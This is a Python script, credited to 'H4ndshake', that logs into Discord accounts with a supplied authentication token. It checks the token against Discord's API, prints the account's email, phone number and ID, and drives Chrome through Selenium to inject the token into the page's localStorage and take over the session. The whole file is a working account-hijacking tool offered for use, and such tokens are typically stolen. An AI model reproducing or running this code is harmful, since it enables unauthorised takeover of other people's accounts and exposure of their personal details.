import json, requests, os, platform, re, subprocess, sys, time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from colorama import Fore
from colorama import Style

path_to_chromedriver = r'path/to/your/chromedriver.exe'

def display_ascii_art():
    print('''
                 ..ooo@@@XXX%%%xx..
              .oo@@XXX%x%xxx..     ` .
            .o@XX%%xx..               ` .
          o@X%..                  ..ooooooo
        .@X%x.                 ..o@@^^   ^^@@o
      .ooo@@@@@@ooo..      ..o@@^          @X%
      o@@^^^     ^^^@@@ooo.oo@@^             %
     xzI    -*--      ^^^o^^        --*-     %
     @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
    I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x   
    I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
     @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
      ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
            o@@^^^ooo I^^ I^o ooo   .  x
            oo @^ IX      I   ^X  @^ oo
            IX     U  .        V     IX
             V     .           .     V                      
    ''')

def get_chrome_version():
    """ Get the version of Chrome installed on the system """
    try:
        output = subprocess.check_output(
            r'reg query "HKEY_CURRENT_USER\Software\Google\Chrome\BLBeacon" /v version',
            shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode('utf-8')
        version = re.search(r'[\d.]+', output).group(0)
        return version
    except Exception as e:
        print(f"An error occurred while fetching Chrome version: {e}")
        return None

def check_chromedriver_exists():
    """ Check if chromedriver.exe exists in the folder """
    if os.path.exists(path_to_chromedriver):
        return True
    else:
        return False

def get_correct_chromedriver_link(chrome_version):
    """ Construct the download link for the correct ChromeDriver version """
    base_url = "https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json"
    major_version = chrome_version.split('.')[0]
    response = requests.get(base_url).json()
    for version_info in response['versions']:
        if version_info['version'].startswith(major_version):
            for download_info in version_info['downloads']['chromedriver']:
                if 'win64' in download_info['platform']:
                    return download_info['url']
    return None

def check_and_update_chromedriver():
    chrome_version = get_chrome_version()
    if not chrome_version:
        print("Could not find the installed version of Chrome.")
        return

    if check_chromedriver_exists():
        print("ChromeDriver found in the directory and ready to use.")
    else:
        print(f"\n ChromeDriver not found. Chrome version: {chrome_version}")
        download_link = get_correct_chromedriver_link(chrome_version)
        if download_link:
            print(f"Download the correct ChromeDriver version from here: {download_link}")
        else:
            print("Could not find a matching ChromeDriver version.")

def clear():
    print("\n" * 100)
    startmenu()

display_ascii_art()
print("Welcome To Discord Token Login       Dev:H4ndshake")
print("")
request = requests.Session()

while True:
    token = input("Enter Token > ")
    if token == "exit":
        print("Bye!")
        exit()

    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

    if response.status_code == 200:
        break
    else:
        print("\n[*] Token Is Invalid\n")


headers = {
    'Authorization': token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
}

print('''
 [1] Token Info        [2] Login To Token

''')

def tokenLogin(token):
    try:
        check_and_update_chromedriver()
        headers = {
            'Authorization': token
        }
        src = requests.get('https://discord.com/api/v6/users/@me', headers=headers, timeout=10)
        if src.status_code == 403 or src.status_code == 401:
            print("Token is Invalid")
            startmenu() 
        else:
            chrome_options = Options()
            chrome_options.add_experimental_option("detach", True)
            service = Service(path_to_chromedriver)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            script = """
                function login(token) {
                    setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`;
                    }, 50);
                    setTimeout(() => {
                        location.reload();
                    }, 2500);
                }
            """
            driver.get("https://discord.com/login")
            driver.execute_script(script + f'\nlogin("{token}")')
    except Exception as e:
        print("")

def tokeninfo():
    src = request.get(
        'https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
    response = json.loads(src.content)
    if src.status_code == 403:
        print("[*] Token Is Invalid")
        startmenu()
    elif src.status_code == 401:
        print("[*] Token Is Invalid")
        startmenu()
    else:
        print(f"Token Is Valid")
        infotk = f'''\n   Name: {response['username']}#{response['discriminator']}   ID: {response['id']}\n   Email: {response['email']}   Phone: {response['phone']}\n   Verified: {response['verified']}          MFA: {response['nsfw_allowed']}\n   AvatarURL: https://cdn.discordapp.com/avatars/{response['id']}/{response['avatar']}.png?size=1024'''
        print(infotk)
        startmenu()

def startmenu():
    keywrd = input("Command > ")
    if keywrd == "exit":
        print("Bye!")
        exit()
    elif keywrd == "clear":
        clear()
    elif keywrd == "1":
        tokeninfo()
        startmenu()
    elif keywrd == "2":
            tokenLogin(token)
            startmenu()
    else:
        print(" [!] Command Not Found !")
        startmenu()
startmenu()